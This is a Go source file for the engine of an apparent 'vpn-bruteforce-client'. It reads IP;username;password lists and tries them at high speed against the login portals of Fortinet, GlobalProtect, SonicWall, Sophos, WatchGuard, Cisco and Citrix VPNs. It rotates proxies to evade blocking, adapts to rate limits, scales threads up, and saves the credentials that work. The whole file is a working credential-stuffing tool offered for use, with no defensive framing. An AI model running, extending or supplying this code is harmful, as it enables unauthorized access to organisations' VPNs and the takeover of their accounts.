package bruteforce

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
	"golang.org/x/sync/semaphore"
	"golang.org/x/time/rate"
	"vpn-bruteforce-client/internal/config"
	"vpn-bruteforce-client/internal/stats"
)

type Engine struct {
	config       *config.Config
	stats        *stats.Stats
	client       *http.Client
	proxyClients []*http.Client
	semaphore    *semaphore.Weighted
	rateLimiter  *rate.Limiter
	outputFile   *os.File
	outputMutex  sync.Mutex
	ctx          context.Context
	cancel       context.CancelFunc
	wg           sync.WaitGroup

	// Performance optimizations
	credentialPool sync.Pool
	responsePool   sync.Pool
	currentProxy   int64

	// Advanced error tracking
	ipBlockTracker  sync.Map // IP -> block count
	errorTracker    sync.Map // IP -> error types
	lastSuccessTime int64

	// Dynamic scaling
	currentThreads int64
	targetRPS      int64
	actualRPS      int64
	lastScaleTime  time.Time

	taskBuilder *TaskBuilder

	logger func(level, message, source string)
}

type Credential struct {
	IP       string
	Username string
	Password string
}

type Response struct {
	StatusCode int
	Body       []byte
	Headers    map[string]string
	Duration   time.Duration
}

func New(cfg *config.Config, statsManager *stats.Stats, builder *TaskBuilder) (*Engine, error) {
	ctx, cancel := context.WithCancel(context.Background())

	// Create ultra-aggressive HTTP client
	transport := &http.Transport{
		MaxIdleConns:        cfg.MaxIdleConns * 2,
		MaxConnsPerHost:     cfg.MaxConnsPerHost * 2,
		IdleConnTimeout:     cfg.IdleConnTimeout / 2,
		TLSHandshakeTimeout: cfg.TLSHandshakeTimeout / 2,
		DisableKeepAlives:   true,
		DisableCompression:  true,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS10,
		},
		DialContext: (&net.Dialer{
			Timeout:   cfg.Timeout / 2,
			KeepAlive: 0,
			DualStack: true,
		}).DialContext,
		ForceAttemptHTTP2:      false,
		MaxResponseHeaderBytes: 2048,
		WriteBufferSize:        4096,
		ReadBufferSize:         4096,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   cfg.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	outputFile, err := os.OpenFile(cfg.OutputFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("failed to open output file: %w", err)
	}

	// Rate limiter for controlled load
	var rateLimiter *rate.Limiter
	if cfg.RateLimit > 0 {
		rateLimiter = rate.NewLimiter(rate.Limit(cfg.RateLimit), cfg.RateLimit)
	}

	engine := &Engine{
		config:         cfg,
		stats:          statsManager,
		client:         client,
		semaphore:      semaphore.NewWeighted(int64(cfg.Threads)),
		rateLimiter:    rateLimiter,
		outputFile:     outputFile,
		ctx:            ctx,
		cancel:         cancel,
		currentThreads: int64(cfg.Threads),
		targetRPS:      int64(cfg.RateLimit),
		lastScaleTime:  time.Now(),
		taskBuilder:    builder,
		logger:         nil,
	}

	// Initialize object pools for zero-allocation
	engine.credentialPool.New = func() interface{} {
		return &Credential{}
	}

	engine.responsePool.New = func() interface{} {
		return &Response{
			Headers: make(map[string]string, 10),
			Body:    make([]byte, 0, 8192),
		}
	}

	// Setup proxy clients if enabled
	if cfg.ProxyEnabled {
		engine.setupProxyClients()
	}

	return engine, nil
}

// SetLogger registers a logger callback for error reporting.
func (e *Engine) SetLogger(fn func(level, message, source string)) {
	e.logger = fn
}

func (e *Engine) setupProxyClients() {
	baseTransport, ok := e.client.Transport.(*http.Transport)
	if !ok {
		return
	}

	proxyList := e.config.ProxyList
	if e.taskBuilder != nil && len(e.taskBuilder.ProxyList) > 0 {
		proxyList = e.taskBuilder.ProxyList
	}

	e.proxyClients = make([]*http.Client, 0, len(proxyList))

	for _, raw := range proxyList {
		addr := strings.TrimSpace(raw)
		if addr == "" {
			continue
		}

		tr := baseTransport.Clone()

		switch strings.ToLower(e.config.ProxyType) {
		case "socks5", "socks", "socks5h":
			// Allow user:pass@host:port as well as plain host:port
			proxyURL, err := url.Parse(addr)
			if err != nil || proxyURL.Host == "" {
				proxyURL, _ = url.Parse("socks5://" + addr)
			}

			var auth *proxy.Auth
			if proxyURL.User != nil {
				pass, _ := proxyURL.User.Password()
				auth = &proxy.Auth{User: proxyURL.User.Username(), Password: pass}
			}

			d, err := proxy.SOCKS5("tcp", proxyURL.Host, auth, &net.Dialer{
				Timeout:   e.config.Timeout / 2,
				KeepAlive: 0,
				DualStack: true,
			})
			if err != nil {
				fmt.Printf("failed to init SOCKS5 proxy %s: %v\n", addr, err)
				continue
			}

			if cd, ok := d.(proxy.ContextDialer); ok {
				tr.DialContext = cd.DialContext
			} else {
				tr.DialContext = func(ctx context.Context, network, address string) (net.Conn, error) {
					return d.Dial(network, address)
				}
			}
			tr.Proxy = nil

		default:
			proxyURL, err := url.Parse(addr)
			if err != nil || proxyURL.Scheme == "" {
				proxyURL, _ = url.Parse(fmt.Sprintf("%s://%s", e.config.ProxyType, addr))
			}

			tr.Proxy = http.ProxyURL(proxyURL)
			tr.DialContext = (&net.Dialer{
				Timeout:   e.config.Timeout / 2,
				KeepAlive: 0,
				DualStack: true,
			}).DialContext
		}

		client := &http.Client{
			Transport: tr,
			Timeout:   e.config.Timeout,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}

		e.proxyClients = append(e.proxyClients, client)
	}
}

func (e *Engine) getHTTPClient() *http.Client {
	if !e.config.ProxyEnabled || len(e.proxyClients) == 0 {
		return e.client
	}

	if !e.config.ProxyRotation || len(e.proxyClients) == 1 {
		return e.proxyClients[0]
	}

	idx := atomic.AddInt64(&e.currentProxy, 1)
	return e.proxyClients[int(idx)%len(e.proxyClients)]
}

func (e *Engine) doRequest(req *http.Request) (*http.Response, error) {
	client := e.getHTTPClient()
	return client.Do(req)
}

func (e *Engine) Start() error {
	defer func() {
		if err := e.outputFile.Close(); err != nil {
			log.Printf("output file close error: %v", err)
		}
	}()

	// Load credentials with streaming for large files
	credChan := make(chan Credential, 10000)

	// Start credential loader
	go e.loadCredentialsStream(credChan)

	// Start dynamic thread scaler
	if e.config.AutoScale {
		go e.dynamicScaler()
	}

	// Start RPS monitor
	go e.rpsMonitor()

	fmt.Printf("🚀 Ultra-Fast VPN Client v3.0 - Production Ready\n")
	fmt.Printf("🎯 Target RPS: %d | Threads: %d | CPU cores: %d\n",
		e.targetRPS, e.currentThreads, runtime.NumCPU())
	fmt.Printf("⚡ Optimizations: Zero-alloc pools, Dynamic scaling, Smart retries\n")
	fmt.Printf("🔧 VPN Type: %s | Auto-scale: %v | Streaming: %v\n\n",
		e.config.VPNType, e.config.AutoScale, e.config.StreamingMode)

	// Start worker pool
	for i := 0; i < int(e.currentThreads); i++ {
		e.wg.Add(1)
		go e.ultraFastWorker(credChan)
	}

	// Wait for completion
	e.wg.Wait()
	return nil
}

func (e *Engine) ultraFastWorker(credChan <-chan Credential) {
	defer e.wg.Done()

	// Pre-allocate buffers
	buf := make([]byte, e.config.BufferSize)

	for {
		select {
		case cred, ok := <-credChan:
			if !ok {
				return
			}
			e.processCredentialUltraFast(cred, buf)
		case <-e.ctx.Done():
			return
		}
	}
}

func (e *Engine) processCredentialUltraFast(cred Credential, buf []byte) {
	// Rate limiting
	if e.rateLimiter != nil {
		if err := e.rateLimiter.Wait(e.ctx); err != nil {
			return
		}
	}

	// Acquire semaphore
	if err := e.semaphore.Acquire(e.ctx, 1); err != nil {
		return
	}
	defer e.semaphore.Release(1)

	// Get response object from pool
	resp := e.responsePool.Get().(*Response)
	defer func() {
		resp.Body = resp.Body[:0] // Reset slice
		for k := range resp.Headers {
			delete(resp.Headers, k)
		}
		e.responsePool.Put(resp)
	}()

	// Create request context with timeout
	ctx, cancel := context.WithTimeout(e.ctx, e.config.Timeout)
	defer cancel()

	start := time.Now()
	success, err := e.checkVPNUltraFast(ctx, cred, resp, buf)
	duration := time.Since(start)

	// Update RPS counter
	atomic.AddInt64(&e.actualRPS, 1)

	// ✅ УЛУЧШЕННАЯ ОБРАБОТКА ОШИБОК И РЕЗУЛЬТАТОВ
	if err != nil {
		e.handleAdvancedError(cred.IP, err, duration)
		return
	}

	if success {
		e.stats.IncrementGoods()
		e.saveValidUltraFast(cred)
		atomic.StoreInt64(&e.lastSuccessTime, time.Now().Unix())

		if e.config.Verbose {
			fmt.Printf("\n✅ VALID: %s;%s;%s (%.2fms)",
				cred.IP, cred.Username, cred.Password, float64(duration.Nanoseconds())/1e6)
		}
	} else {
		e.stats.IncrementBads()
		if e.config.Verbose {
			fmt.Printf("\n❌ INVALID: %s;%s;%s (%.2fms)",
				cred.IP, cred.Username, cred.Password, float64(duration.Nanoseconds())/1e6)
		}
	}
}

func (e *Engine) checkVPNUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	switch e.config.VPNType {
	case "fortinet":
		return e.checkFortinetUltraFast(ctx, cred, resp, buf)
	case "globalprotect", "paloalto":
		return e.checkGlobalProtectUltraFast(ctx, cred, resp, buf)
	case "sonicwall":
		return e.checkSonicWallUltraFast(ctx, cred, resp, buf)
	case "sophos":
		return e.checkSophosUltraFast(ctx, cred, resp, buf)
	case "watchguard":
		return e.checkWatchGuardUltraFast(ctx, cred, resp, buf)
	case "cisco":
		return e.checkCiscoUltraFast(ctx, cred, resp, buf)
	case "citrix":
		return e.checkCitrixUltraFast(ctx, cred, resp, buf)
	default:
		e.stats.IncrementErrors()
		return false, fmt.Errorf("unknown VPN type: %s", e.config.VPNType)
	}
}

func (e *Engine) handleAdvancedError(ip string, err error, duration time.Duration) {
	errStr := err.Error()
	if e.logger != nil {
		e.logger("error", fmt.Sprintf("%s: %s", ip, errStr), "engine")
	}

	// ✅ УЛУЧШЕННАЯ КЛАССИФИКАЦИЯ ОШИБОК
	switch {
	case strings.Contains(errStr, "timeout") || strings.Contains(errStr, "deadline exceeded"):
		e.stats.IncrementOffline()
		e.trackError(ip, "timeout")
		if e.config.Verbose {
			fmt.Printf("\n⏰ TIMEOUT: %s (%.2fms)", ip, float64(duration.Nanoseconds())/1e6)
		}
	case strings.Contains(errStr, "connection refused") || strings.Contains(errStr, "connect: connection refused"):
		e.stats.IncrementOffline()
		e.trackError(ip, "refused")
		if e.config.Verbose {
			fmt.Printf("\n🚫 REFUSED: %s", ip)
		}
	case strings.Contains(errStr, "no route to host") || strings.Contains(errStr, "network unreachable"):
		e.stats.IncrementOffline()
		e.trackError(ip, "unreachable")
		if e.config.Verbose {
			fmt.Printf("\n🌐 UNREACHABLE: %s", ip)
		}
	case strings.Contains(errStr, "too many requests") || strings.Contains(errStr, "rate limit") || strings.Contains(errStr, "429"):
		e.stats.IncrementIPBlock()
		e.trackIPBlock(ip)
		if e.config.Verbose {
			fmt.Printf("\n🚧 RATE_LIMITED: %s", ip)
		}
	case strings.Contains(errStr, "certificate") || strings.Contains(errStr, "tls") || strings.Contains(errStr, "ssl"):
		e.stats.IncrementErrors()
		e.trackError(ip, "ssl_error")
		if e.config.Verbose {
			fmt.Printf("\n🔒 SSL_ERROR: %s", ip)
		}
	case duration > e.config.Timeout*2:
		e.stats.IncrementOffline()
		e.trackError(ip, "slow")
		if e.config.Verbose {
			fmt.Printf("\n🐌 SLOW: %s (%.2fms)", ip, float64(duration.Nanoseconds())/1e6)
		}
	default:
		e.stats.IncrementErrors()
		e.trackError(ip, "unknown")
		if e.config.Verbose {
			fmt.Printf("\n❓ ERROR: %s - %s", ip, errStr)
		}
	}
}

func (e *Engine) trackError(ip, errorType string) {
	if errors, ok := e.errorTracker.Load(ip); ok {
		errorMap := errors.(map[string]int)
		errorMap[errorType]++
		e.errorTracker.Store(ip, errorMap)
	} else {
		errorMap := make(map[string]int)
		errorMap[errorType] = 1
		e.errorTracker.Store(ip, errorMap)
	}
}

func (e *Engine) trackIPBlock(ip string) {
	if count, ok := e.ipBlockTracker.Load(ip); ok {
		newCount := count.(int) + 1
		e.ipBlockTracker.Store(ip, newCount)

		// If IP is blocked too many times, add delay
		if newCount > 5 {
			time.Sleep(time.Second * time.Duration(newCount))
		}
	} else {
		e.ipBlockTracker.Store(ip, 1)
	}
}

func (e *Engine) loadCredentialsStream(credChan chan<- Credential) {
	defer close(credChan)

	file, err := os.Open(e.config.InputFile)
	if err != nil {
		fmt.Printf("Error opening input file: %v\n", err)
		return
	}
	defer func() {
		if err := file.Close(); err != nil {
			fmt.Printf("Error closing input file: %v\n", err)
		}
	}()

	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 64*1024), 1024*1024) // 1MB buffer for large lines

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.Split(line, ";")
		if len(parts) < 3 {
			continue
		}

		cred := Credential{
			IP:       strings.TrimSpace(parts[0]),
			Username: strings.TrimSpace(parts[1]),
			Password: strings.TrimSpace(parts[2]),
		}

		select {
		case credChan <- cred:
		case <-e.ctx.Done():
			return
		}
	}
}

func (e *Engine) saveValidUltraFast(cred Credential) {
	e.outputMutex.Lock()
	defer e.outputMutex.Unlock()

	// Pre-format string to avoid allocations
	line := fmt.Sprintf("%s;%s;%s\n", cred.IP, cred.Username, cred.Password)
	if _, err := e.outputFile.WriteString(line); err != nil {
		log.Printf("write output file error: %v", err)
	}
	if err := e.outputFile.Sync(); err != nil {
		log.Printf("sync output file error: %v", err)
	}
}

func (e *Engine) dynamicScaler() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			e.adjustThreads()
		case <-e.ctx.Done():
			return
		}
	}
}

func (e *Engine) adjustThreads() {
	currentRPS := atomic.SwapInt64(&e.actualRPS, 0) * 6 // Convert to per-minute
	currentThreads := atomic.LoadInt64(&e.currentThreads)

	// Scale up if RPS is below target and we have CPU headroom
	if currentRPS < e.targetRPS && currentThreads < int64(e.config.MaxThreads) {
		newThreads := currentThreads + int64(runtime.NumCPU()*10)
		if newThreads > int64(e.config.MaxThreads) {
			newThreads = int64(e.config.MaxThreads)
		}
		atomic.StoreInt64(&e.currentThreads, newThreads)

		fmt.Printf("🔼 Scaled UP to %d threads (RPS: %d)\n", newThreads, currentRPS)
	}

	// Scale down if we're over-performing and wasting resources
	if currentRPS > e.targetRPS*2 && currentThreads > int64(e.config.MinThreads) {
		newThreads := currentThreads - int64(runtime.NumCPU()*5)
		if newThreads < int64(e.config.MinThreads) {
			newThreads = int64(e.config.MinThreads)
		}
		atomic.StoreInt64(&e.currentThreads, newThreads)
		fmt.Printf("🔽 Scaled DOWN to %d threads (RPS: %d)\n", newThreads, currentRPS)
	}
}

func (e *Engine) rpsMonitor() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			rps := atomic.SwapInt64(&e.actualRPS, 0)
			if rps > 0 {
				fmt.Printf("\r⚡ Current RPS: %d | Threads: %d | Target: %d",
					rps, atomic.LoadInt64(&e.currentThreads), e.targetRPS)
			}
		case <-e.ctx.Done():
			return
		}
	}
}

func (e *Engine) Stop() {
	e.cancel()
}